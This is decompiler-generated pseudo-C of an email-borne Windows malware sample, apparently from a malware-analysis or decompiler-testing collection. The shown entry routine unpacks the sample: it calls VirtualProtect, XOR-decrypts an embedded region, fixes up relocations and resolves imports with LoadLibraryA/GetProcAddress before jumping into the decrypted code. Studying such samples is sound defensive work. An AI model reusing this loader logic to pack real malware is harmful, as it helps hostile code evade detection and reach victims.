// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0184/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 ecx, word32 edx, word32 esi, word32 dwArg00, word32 dwArg04)
{
fn00401000_entry:
l00401000:
	word32 eax_26 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	Eq_16 * ebx_15 = null
	Eq_16 * edi_285 = eax_26 + 0x0000001E
	branch AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l00401030
l0040102D:
	edi_285 = eax_26 + 0x0000001E ^ 0x0000000E;
l00401030:
	fp->dwFFFFFFE4 = 0x00000059;
	CloseHandle(0xFFFFFFFF)
	fp->dwFFFFFFE4 = fp - 0x00000008;
	fp->dwFFFFFFE4 = 0x00000040;
	fp->dwFFFFFFE4 = 0x00003000;
	fp->dwFFFFFFE4 = 0x00401000;
	VirtualProtect(0x00000000, 0x00000000, 0xFFFFFFFF, 0xFFFFFFFF)
	Eq_66 * eax_57 = null
l00401051:
	branch ebx_15 != edi_285 l0040105A
l00401058:
	ebx_15 = null;
l0040105A:
	byte v15_79 = eax_57->b401288 ^ ebx_15->b404000
	eax_57->b401288 = v15_79;
	eax_57 = eax_57 + 1;
	ebx_15 = ebx_15 + 1;
	branch eax_57 <u (Eq_66 *) 0x00001440 l00401051
l00401076:
	Eq_90 * ecx_120 = &globals->t402588
	up32 esi_103 = 0x00000000
	up32 dwLoc04_118 = 0x00000000
l00401095:
	word32 eax_104 = ecx_120->dw0004
	Eq_112 * edx_110 = &ecx_120->t0008
	branch eax_104 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004010D3
l004010A4:
	uint32 edi_259 = eax_104 - 0x00000008 >>u 0x00000001
l004010A6:
	word32 eax_262 = (word32) edx_110->w0000
	branch (eax_262 & 0x0000F000) != 0x00003000 l004010C7
l004010BC:
	Eq_119 * eax_276 = (eax_262 & 0x00000FFF) + ecx_120->dw0000
	eax_276->dw401008 = eax_276->dw401008 + 0xF0401008;
l004010C7:
	edx_110 = edx_110 + 1;
	edi_259 = edi_259 - 0x00000001;
	branch edi_259 != 0x00000000 l004010A6
l004010CF:
	esi_103 = dwLoc04_118;
l004010D3:
	esi_103 = esi_103 + ecx_120->dw0004;
	dwLoc04_118 = esi_103;
	ecx_120 = ecx_120 + Mem80[ecx_120 + 0x00000004:word32];
	branch esi_103 <u 0x000000E8 l00401095
l004010E8:
	Eq_143 * esi_124 = &globals->t401D6C
	Eq_143 * dwLoc04_125 = &globals->t401D6C
	branch globals->dw401D7C == 0x00000000 l00401169
l004010FB:
	esi_168 = esi_124;
l00401100:
	Eq_143 * esi_168
	Eq_162 eax_173 = LoadLibraryA(esi_168->dw000C + 0x00401008)
	branch eax_173 == 0x00000000 l0040115C
l00401115:
	word32 edi_197 = esi_168->dw0000
	branch edi_197 != 0x00000000 l0040111E
l0040111B:
	edi_197 = esi_168->dw0010;
l0040111E:
	Eq_195 * edi_202 = edi_197 + 0x00401008
	Eq_198 * esi_205 = esi_168->dw0010 + 0x00401008
	branch edi_202->dw0000 == 0x00000000 l00401158
l0040112D:
l00401130:
	Eq_214 dwLoc1C_239
	int32 eax_234 = edi_202->dw0000
	word16 ax_235 = (word16) eax_234
	branch eax_234 >= 0x00000000 l0040113F
l00401139:
	dwLoc1C_239 = (word32) ax_235;
	goto l00401144
l0040113F:
	dwLoc1C_239 = eax_234 + 0x0040100A;
l00401144:
	esi_205->dw0000 = GetProcAddress(eax_173, dwLoc1C_239);
	edi_202 = edi_202 + 1;
	esi_205 = esi_205 + 1;
	branch edi_202->dw0000 != 0x00000000 l00401130
l00401158:
	esi_168 = dwLoc04_125;
l0040115C:
	esi_168 = esi_168 + 1;
	dwLoc04_125 = esi_168;
	branch esi_168->dw0010 != 0x00000000 l00401100
l00401169:
	0x00401A68()
	ExitProcess(0x00000000)
	0x00401A68()
	ExitProcess(0x00000000)
fn00401000_exit:
}

